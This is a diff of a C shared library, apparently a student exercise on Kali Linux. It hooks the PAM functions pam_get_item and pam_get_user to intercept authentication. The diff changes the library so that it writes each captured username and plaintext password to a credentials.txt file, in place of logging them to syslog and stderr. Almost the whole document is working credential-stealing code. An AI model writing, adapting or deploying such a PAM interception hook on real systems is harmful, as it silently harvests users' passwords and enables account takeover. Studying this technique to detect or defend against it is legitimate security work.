@@ -1,9 +1,11 @@
 #define _GNU_SOURCE
 #include <stdio.h>
+#include <stdlib.h>
 #include <dlfcn.h>
 #include <security/pam_appl.h>
 #include <security/pam_modules.h>
 #include <syslog.h>
+#include <string.h>
 #include <time.h>
 
 // Fonction pour obtenir l'heure actuelle en tant que chaîne
@@ -19,15 +21,23 @@ const char *get_current_time() {
 typedef int (*pam_get_item_t)(const pam_handle_t *, int, const void **);
 typedef int (*pam_get_user_t)(pam_handle_t *, const char **, const char *);
 
-// Affichage d'un séparateur pour identifier le début et la fin
-void print_separator(const char *message) {
-    fprintf(stderr, "-------------------------------------------------------------------------------\n");
-    fprintf(stderr, "%s\n", message);
-    fprintf(stderr, "-------------------------------------------------------------------------------\n");
+// Fonction pour écrire dans le fichier credentials.txt
+void write_to_file(const char *type, const char *data) {
+    FILE *file = fopen("/home/kali/Partiel_C/credentials.txt", "a"); // Chemin absolu
+    if (!file) {
+        perror("----------------------------Erreur lors de l'ouverture de credentials.txt------------------");
+        return;
+    }
+    fprintf(file, "[%s] %s : %s\n", get_current_time(), type, data);
+    fclose(file);
+
+    // Message de débogage
+    fprintf(stderr, "--------------------------------[DEBUG] Ecriture dans credentials.txt effectuée------------------------------------\n");
 }
 
 // Intercepteur pour pam_get_item
 int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
+    static int password_logged = 0; // Variable statique pour éviter de répéter l'écriture du mot de passe
     static pam_get_item_t original_pam_get_item = NULL;
 
     // Charger la fonction originale
@@ -39,24 +49,24 @@ int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
         }
     }
 
-    print_separator("Entrée dans pam_get_item");
-
     // Appeler la fonction originale
     int retval = original_pam_get_item(pamh, item_type, item);
 
-    // Si on capture un mot de passe (PAM_AUTHTOK)
-    if (retval == PAM_SUCCESS && item_type == PAM_AUTHTOK && item && *item) {
-        syslog(LOG_INFO, "[%s] Mot de passe capturé : %s", get_current_time(), (const char *)*item);
-        fprintf(stderr, "[DEBUG] Mot de passe capturé : %s\n", (const char *)*item);
+    // Si on capture un mot de passe (PAM_AUTHTOK) et qu'il n'a pas déjà été écrit
+    if (retval == PAM_SUCCESS && item_type == PAM_AUTHTOK && item && *item && !password_logged) {
+        char local_buffer[256];
+        strncpy(local_buffer, (const char *)*item, sizeof(local_buffer) - 1);
+        local_buffer[sizeof(local_buffer) - 1] = '\0'; // Assure une terminaison
+        write_to_file("Mot de passe", local_buffer);
+        password_logged = 1; // Indiquer que le mot de passe a été écrit
     }
-
-    print_separator("Sortie de pam_get_item");
 
     return retval;
 }
 
 // Intercepteur pour pam_get_user
 int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt) {
+    static int user_logged = 0; // Variable statique pour éviter de répéter l'écriture du login
     static pam_get_user_t original_pam_get_user = NULL;
 
     // Charger la fonction originale
@@ -68,18 +78,14 @@ int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt) {
         }
     }
 
-    print_separator("Entrée dans pam_get_user");
-
     // Appeler la fonction originale
     int retval = original_pam_get_user(pamh, user, prompt);
 
-    // Si le login est récupéré avec succès
-    if (retval == PAM_SUCCESS && user && *user) {
-        syslog(LOG_INFO, "[%s] Login capturé : %s", get_current_time(), *user);
-        fprintf(stderr, "[DEBUG] Login capturé : %s\n", *user);
+    // Si le login est récupéré avec succès et qu'il n'a pas déjà été écrit
+    if (retval == PAM_SUCCESS && *user && !user_logged) {
+        write_to_file("Login", *user);
+        user_logged = 1; // Indiquer que le login a été écrit
     }
-
-    print_separator("Sortie de pam_get_user");
 
     return retval;
 }
